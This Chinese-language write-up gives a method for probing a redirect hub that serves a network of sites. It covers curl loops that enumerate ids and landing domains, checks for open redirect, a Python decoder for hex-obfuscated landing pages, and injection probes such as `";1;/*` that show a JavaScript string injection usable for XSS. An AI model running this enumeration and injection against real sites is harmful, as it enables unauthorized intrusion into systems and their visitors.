# 站群跳转中枢探测法（id 定 host、code 入 JS 字符串）

## 结构
入口站 301 → 中枢 `https://<hub>/<任意前缀>/<数字id>/<code>` → 302 → 落地页 `https://<由 id 决定的 host>/<固定前缀>-<code>` 或 `...? _c=<code>`

## 1) 判定 id 是否活维度（一条命令够）
```bash
P='-x http://127.0.0.1:7892'
for id in 213039 213040 213041 213042 1 0 -1 999999; do
  curl $P -sk -o /dev/null -D - --max-time 15 \
    "https://HUB/mk/$id/CODE" | grep -i '^location'
done
```
- 换 id → Location 的 host/模板跟着变 = **id 是 DB 活维度**（未知 id 通常 404）
- 前缀无语义：`/mk /hy /go /jump /r /apk /dy` 等价，只有 `/<前缀>/<id>/<code>` 三段才路由

## 2) 批量枚举投放位（一次几百个，全部 302）
```bash
for id in $(seq 213030 213130); do
  curl $P -sk -o /dev/null -D - --max-time 15 "https://HUB/mk/$id/CODE" \
    | grep -i '^location' | sed "s/^/$id /"
  sleep 0.3
done | tee enum.txt
```
聚合：`sed` 抽出 host 与路径形态 → 得落地域名清单 + 模板族（实测 172 个 id → 50 域 / 10 模板）

## 3) 开放重定向是否成立（决定要不要继续追）
看模板里 code 的落点：
- `/固定前缀-<code>` → **不可能**开放重定向（前缀切断 `//` 的 authority 语义）
- `?_c=<code>` → code 只进查询值，host 固定
- 只有当模板是 `https://<code>` 或 `<code>` 整段才是真开放重定向
补充否证：36 个重定向参数只被**透传**进查询串（`...?redirect=https%3A%2F%2Fexample.com`）；
`X-Forwarded-Host/X-Original-URL/X-Rewrite-URL` 无效；改 `Host` → CloudFront 403。

## 4) code 的真正落点：落地页 JS 字符串（可 XSS）
落地页 body 是 `document.write(hex2bin('...'))`，先解码再审计：
```bash
curl $P -sk "https://LANDING/hjsqnew-CODE" -o page.html
python3 - <<'PY'
import re,binascii
s=open('page.html',encoding='utf-8',errors='replace').read()
dec="".join(binascii.unhexlify(h).decode('utf-8','replace') for h in re.findall(r"hex2bin\('([0-9a-fA-F]+)'\)",s))
open('page.decoded.html','w').write(dec)
i=dec.find('channel:'); print(dec[i:i+200])
PY
```
- 正常：`channel: "hjhlswq99",`
- 塞 `"`：`channel: "zz"q1",` ← **字符串闭合，说明双引号未转义**（部分模板族过滤 `"`，必须逐族实测，不要一概而论）
- 塞 `";1;/*`：`channel: "zz";1;/*",` ← 语句级注入成立（`//` 会被 nginx 折成单 `/`，用 `%2f*` 代替）
- code 同时进入 `copyToClip("channel://<code>=page_id://<uuid>")` 等 3~4 处同样未转义

## 5) 环境坑（会直接毁掉判据）
- 站群在 CloudFront 后面，**偶发 `200` + 空 body**（无 Location）：**异常响应必须重发一次确认**，否则会把 302 误判成 200
- 落地页内嵌 `<!-- uuid_ts_ip -->` + `trace_id` → 比 md5 前先正则剥离 UUID/时间戳
- 那个注释里的 IP 是**访客自己的出口 IP**（用 `curl -x proxy https://api.ipify.org` 对照即知），**不是源站泄露**，别当 CDN 绕过成果